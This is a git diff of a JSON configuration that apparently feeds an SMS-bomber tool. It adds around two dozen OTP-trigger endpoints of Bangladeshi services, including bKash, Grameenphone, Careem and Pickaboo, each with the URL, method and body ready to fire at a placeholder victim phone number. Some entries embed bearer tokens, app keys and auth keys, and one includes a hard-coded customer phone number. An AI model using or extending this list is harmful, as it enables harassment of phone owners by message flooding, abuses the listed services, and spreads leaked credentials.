@@ -1,16 +1,8 @@
-[{
+[
+    {
         "name": "BookFlix",
         "config": {
             "url": "https://bookflix.com.bd/api/v1/get-user-verification-otp?phone_no=0_MSISDN_",
-            "method": "get",
-            "headers": {},
-            "body": ""
-        }
-    },
-    {
-        "name": "SalaryBox",
-        "config": {
-            "url": "https://api.salaryboxapp.com/prod/v1/auth/check?pn=_MSISDN_&dc=880",
             "method": "get",
             "headers": {},
             "body": ""
@@ -38,29 +30,6 @@
         }
     },
     {
-        "name": "AjkerDeal",
-        "config": {
-            "url": "https://api.ajkerdeal.com/Recover/RetrivePassword/customersignup",
-            "method": "post",
-            "body": "{\"CustomerId\": \"01833268701\",\"MobileOrEmail\": \"'+number+'\",\"Type\": 2}",
-            "headers": {
-                "content-type": "application/json",
-                "accept": "application/json"
-            }
-        }
-    },
-    {
-        "name": "SELF",
-        "config": {
-            "url": "https://www.self-shopping.com/java/old/api/register.php",
-            "method": "post",
-            "body": "{\"number\":0_MSISDN_}",
-            "headers": {
-                "content-type": "application/json"
-            }
-        }
-    },
-    {
         "name": "Agora",
         "config": {
             "url": "https://agorasuperstores.com/customers/send_sms",
@@ -70,6 +39,272 @@
                 "content-type": "application/x-www-form-urlencoded"
             }
         }
+    },
+    {
+        "name": "Cinespot",
+        "config": {
+            "url": "http:\/\/www.cinespot.mobi\/api\/cinespot\/v1\/otp\/sms\/mobile-0_MSISDN_\/operator-All\/send",
+            "method": "get",
+            "body": "",
+            "headers": {
+                "content-type": "application\/x-www-form-urlencoded"
+            }
+        }
+    },
+    {
+        "name": "Jachai",
+        "config": {
+            "url": "http:\/\/auth.jachai.com\/api\/v1\/otp\/send",
+            "method": "post",
+            "body": "{\r\n  \"mobileNumber\":\"0_MSISDN_\"\r\n}",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "Paikaree",
+        "config": {
+            "url": "https:\/\/paikaree.com.bd\/rampai\/v1\/user\/set\/otp",
+            "method": "post",
+            "body": "{\"mobile\":\"0_MSISDN_\"}",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "HEALTH PLUS",
+        "config": {
+            "url": "http:\/\/45.114.85.19:8080\/v3\/otp\/send?msisdn=880_MSISDN_",
+            "method": "get",
+            "body": "",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "Addatimes",
+        "config": {
+            "url": "https:\/\/www.addatimes.com\/api\/login-otp",
+            "method": "post",
+            "body": "{\"phone\":\"0_MSISDN_\"}",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "Guardian",
+        "config": {
+            "url": "http:\/\/api.myguardianbd.com\/api\/requestOtp?new=1&device_id=device&mobile=0_MSISDN_",
+            "method": "post",
+            "body": "",
+            "headers": {
+                "content-type": "application\/x-www-form-urlencoded",
+                "Authorization": "Bearer ef9d4e34ba990125803cef38460d2d3fa86db5691397013f03fca316c3705090f27125f4e4cf34ef7921f2862023881ab4c3"
+            }
+        }
+    },
+    {
+        "name": "iPay",
+        "config": {
+            "url": "https:\/\/app.ipay.com.bd\/api\/v1\/signup\/v2",
+            "method": "post",
+            "body": "{\r\n    \"accountType\": 1,\r\n    \"deviceId\": \"mobile-android-RMX3195-7b0651f073a5bd8d\",\r\n    \"mobileNumber\": \"+880_MSISDN_\"\r\n}",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "Binge",
+        "config": {
+            "url": "https:\/\/ss.binge.buzz\/otp\/send\/login",
+            "method": "post",
+            "body": "{\"phone\": \"0_MSISDN_\"}",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "Webaccess",
+        "config": {
+            "url": "http:\/\/27.131.15.19\/lstyle\/api\/lsotprequest",
+            "method": "post",
+            "body": "{\r\n\"shortcode\":\"2494905\",\r\n \"msisdn\":\"880_MSISDN_\"\r\n}",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "Bkash",
+        "config": {
+            "url": "https:\/\/account.bkash.com\/personal-retail-account\/gateway\/api\/public\/otp\/send",
+            "method": "post",
+            "body": "{\r\n  \"phoneNumber\": \"0_MSISDN_\",\r\n  \"phoneOperator\": \"ROBI_AIRTEL\"\r\n}",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "Green Delta",
+        "config": {
+            "url": "https:\/\/backend-proc-prod-8953778245363662274.insumama.green-delta.com\/token\/user\/otp",
+            "method": "post",
+            "body": "{\"mobileNo\":\"0_MSISDN_\"}",
+            "headers": {
+                "content-type": "application\/json",
+                "app-key": "sV+WD2bDZ|FAg7Pcx"
+            }
+        }
+    },
+    {
+        "name": "AjkerDeal",
+        "config": {
+            "url": "https:\/\/api.ajkerdeal.com\/Recover\/RetrivePassword\/customersignup",
+            "method": "post",
+            "body": "{\"CustomerId\": \"01833268701\",\"MobileOrEmail\":\"0_MSISDN_\", \"Type\": 2}",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "Redx",
+        "config": {
+            "url": "https:\/\/api.redx.com.bd\/v1\/user\/signup",
+            "method": "post",
+            "body": "{\r\n    \"name\": \"0_MSISDN_\",\r\n    \"phoneNumber\": \"0_MSISDN_\",\r\n    \"service\": \"redx\"\r\n}",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "Pickaboo",
+        "config": {
+            "url": "https:\/\/www.pickaboo.com\/rest\/all\/V1\/sendotp?resend=0&storeId=1&mobile=0_MSISDN_&eventType=customer_signup_otp",
+            "method": "post",
+            "body": "",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "Fundesh",
+        "config": {
+            "url": "https:\/\/win.fundesh.com.bd\/authSrv\/auth\/generateOtp",
+            "method": "post",
+            "body": "{\r\n  \"msisdn\": \"0_MSISDN_\",\r\n  \"clientId\": \"d2c_client\"\r\n}",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "Iqra",
+        "config": {
+            "url": "http:\/\/apibeta.iqra-live.com\/api\/v2\/sent-otp\/0_MSISDN_",
+            "method": "post",
+            "body": "",
+            "headers": {
+                "content-type": "application\/json",
+                "x-user-channel": "apps"
+            }
+        }
+    },
+    {
+        "name": "GP",
+        "config": {
+            "url": "https:\/\/grameenphone.revechat.com\/gp\/otp\/push",
+            "method": "post",
+            "body": "{\r\n    \"mobileNo\": \"880_MSISDN_\"\r\n}",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "Jatri",
+        "config": {
+            "url": "https:\/\/api.jslglobal.co\/user-api\/v3\/send-otp?phone=%2B880_MSISDN_&jatri_token=J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj",
+            "method": "post",
+            "body": "",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "Careem",
+        "config": {
+            "url": "https:\/\/sagateway.careem-engineering.com\/identity\/client\/otp?device=ACMA",
+            "method": "post",
+            "body": "{\r\n    \"client_id\": \"562c8b61-bb1f-4198-8b30-8d637a37ded3.acma.careem.com\",\r\n    \"identifier\": \"+880_MSISDN_\",\r\n    \"type\": \"CALL\",\r\n    \"locale\": \"en\",\r\n    \"multiTimeUse\": true\r\n}",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "Bongo",
+        "config": {
+            "url": "https:\/\/api.bongo-solutions.com\/auth\/api\/login\/send-otp",
+            "method": "post",
+            "body": "{\r\n  \"operator\": \"all\",\r\n  \"msisdn\": \"880_MSISDN_\"\r\n}",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "Dhamaka",
+        "config": {
+            "url": "https:\/\/auth.dhamakashopping.com\/api\/otp",
+            "method": "post",
+            "body": "{\"phoneNumber\":\"+880_MSISDN_\"}",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "10ms",
+        "config": {
+            "url": "https:\/\/api.10minuteschool.com\/lms-auth-service\/api\/v4\/auth\/userExists",
+            "method": "post",
+            "body": "{\r\n    \"contact\": \"+880_MSISDN_\",\r\n    \"type\": \"phone\"\r\n}",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "QuirGiri",
+        "config": {
+            "url": "https:\/\/developer.quizgiri.xyz\/api\/v2.0\/send-otp",
+            "method": "post",
+            "body": "{\r\n    \"phone\": \"0_MSISDN_\",\r\n    \"country_code\": \"+880\",\r\n    \"fcm_token\": null\r\n}",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
+    },
+    {
+        "name": "Lecture",
+        "config": {
+            "url": "https:\/\/lecturepublications.org\/api\/otpSend.php",
+            "method": "post",
+            "body": "{\r\n    \"mobile\": \"0_MSISDN_\",\r\n    \"source\": \"APP_v1.4\",\r\n    \"auth_key\": \"14yfRWHcneETqmLekE0F4jyViRURT1\"\r\n}",
+            "headers": {
+                "content-type": "application\/json"
+            }
+        }
     }
-
 ]
